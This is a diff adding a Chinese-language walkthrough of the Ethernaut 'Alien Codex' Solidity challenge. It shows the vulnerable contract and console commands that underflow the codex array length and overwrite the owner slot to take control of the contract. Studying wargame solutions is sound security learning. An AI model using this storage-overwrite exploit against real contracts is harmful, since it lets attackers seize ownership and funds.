@@ -1448,3 +1448,90 @@ contract MagicNum {
 - [Ethereum Virtual Machine Opcodes](https://www.ethervm.io/)
 - [EVM bytecode programming - HackMD](https://hackmd.io/@e18r/r1yM3rCCd)
 - [evm - What is an ABI and why is it needed to interact with contracts? - Ethereum Stack Exchange](https://ethereum.stackexchange.com/questions/234/what-is-an-abi-and-why-is-it-needed-to-interact-with-contracts)
+
+## 19. Alien Codex
+
+声明对合约实例的所有权
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import '../helpers/Ownable-05.sol';
+
+contract AlienCodex is Ownable {
+
+  bool public contact;
+  bytes32[] public codex;
+
+  modifier contacted() {
+    assert(contact);
+    _;
+  }
+  
+  function make_contact() public {
+    contact = true;
+  }
+
+  function record(bytes32 _content) contacted public {
+  	codex.push(_content);
+  }
+
+  function retract() contacted public {
+    codex.length--;
+  }
+
+  function revise(uint i, bytes32 _content) contacted public {
+    codex[i] = _content;
+  }
+}
+```
+
+- 合约继承中，父合约 [`Ownable`](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/Ownable-05.sol) 的代码将全部拷贝至子合约 `AlienCodex`，包括变量 `owner`
+- 根据提示 `Understanding how array storage works`，显然重点在数组 `codex` 上
+- 动态数组与静态变量的存储方式（可参考 [Privacy](#12-privacy)）不同，但仍根据静态变量的存储规则占用一个 `slot p`，用于存储数组长度，数组偏移量为 `keccak(p)`，数组元素的存储方式与静态数组相同
+    - 数组元素偏移量为 `keccak(p) + (index * elementSize)`
+    - `codex` 占用 `slot 1`，计算数组偏移量
+
+        ```js
+        >> web3.utils.soliditySha3({ type: "uint", value: 1 })
+        "0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6"
+        ```
+
+- 地址长度为 32 字节，所以总共有 $2^{256}$ 个 slot，那么，想要修改 `slot 0` 的 `owner`，需要修改下标为 `0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a` 的数组元素
+- 操作数组 `codex` 需要 `contact` 为 `true`
+
+    ```js
+    >> await web3.eth.getStorageAt(instance, 0)
+    "0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272"
+    >> await contract.make_contact()
+    >> await contract.contact()
+    true
+    >> await web3.eth.getStorageAt(instance, 0)
+    "0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272"
+    // slot 0 存储了变量 owner 和 contact 的值
+    ```
+
+- 使用 `retract` 使数组长度下溢出，从而能修改目标下标的元素
+
+    ```js
+    >> await contract.retract();
+    >> await web3.eth.getStorageAt(instance, 1);
+    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    ```
+
+- 修改 `owner`
+
+    ```js
+    >> await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x0000000000000000000000017Fb8134848aDe56fF213eC49edBbB1D830853289");
+    >> await web3.eth.getStorageAt(instance, 0);
+    "0x0000000000000000000000017fb8134848ade56ff213ec49edbbb1d830853289"
+    >> await contract.owner();
+    "0x7Fb8134848aDe56fF213eC49edBbB1D830853289"
+    ```
+
+### 参考资料
+
+- [Inheritance](https://docs.soliditylang.org/en/v0.5.0/contracts.html#inheritance)
+- [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html)
+- [Accessing Private Data | Solidity by Example](https://solidity-by-example.org/hacks/accessing-private-data/)
